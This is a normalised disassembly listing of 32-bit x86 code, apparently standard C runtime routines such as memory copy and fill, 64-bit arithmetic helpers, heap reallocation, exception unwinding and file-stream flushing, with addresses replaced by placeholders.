jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4105b3
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40ecc0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40ed00
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40ed95
call sub_40bbec
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40bbf9
pop ecx
push 0x3
call sub_40a38f
int3
push 0x1
push 0x40000015
push 0x3
call sub_40bdc9
add esp 0xc
sub_40edd0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40ee54 ]
jmp [ ecx * 4 + jump_table_40eed4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ef40 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40f0dc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40efe0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f0dc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40ef40 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40f0dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ef40 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ef40 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ef40 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f0dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f0dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40f0dc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_40f131
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_409fcc
pop ecx
sub_40f160
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_4106bc
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40f1da
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax 0xffffffff
pop ebp
retn
sub_40f220
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40f2b0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_410895
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4108b4
jmp r-xdata
sub_40f2b0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_409fbd
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40f220
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40f312
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40f342
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40f372
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_40b0e5
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409fbd
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_40f4de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40aa97
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40aa97
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_40bf44
mov eax esi
sub_40f553
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_40aa97
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_40aa97
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_40bf44
mov eax esi
jmp r-xdata
sub_40f620
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_40f63b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40aa97
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40aa97
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_40bf44
mov eax esi
sub_40f69e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_40f6dd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40a9c1
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_409fcc
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_40bf63
pop ecx
call sub_40aa97
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_40aa97
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40aa55
pop ecx
mov [ esi ] eax
push esi
call sub_40bf63
pop ecx
test eax eax
je r-xdata
call sub_40aa97
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40aa55
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40f78a
push 0x10
push r--data
call sub_40c290
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40bacf
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f81d
mov eax [ ebp - 0x1c ]
call sub_40c2d5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_410924
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_409fcc
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40f826
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40fa0f
pop ecx
push eax
call sub_411095
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40f88e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40f826
pop ecx
test eax eax
je r-xdata
push esi
call sub_40f8d6
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40fa0f
push eax
call sub_411169
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40f8d6
push 0x14
push r--data
call sub_40c290
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40bacf
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f9a7
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_40c2d5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_40cbcf
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40f978
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40f88e
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40f88e
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40f9b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40aa97
mov [ eax ] 0x9
call sub_40aa97
mov [ eax ] 0x9
call sub_40bf44
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_40fa0f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax 0xffffffff
pop ebp
retn
sub_40fa35
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40fa0f
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_40aa97
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_40aa97
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_40cab7
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_411095
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40f9b9
pop ecx
test eax eax
jne r-xdata
call sub_40cab7
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_411095
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4113b1
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_4112c7
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_40fb99
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_40b678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_40aa97
push 0x16
pop esi
mov [ eax ] esi
call sub_40bf44
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
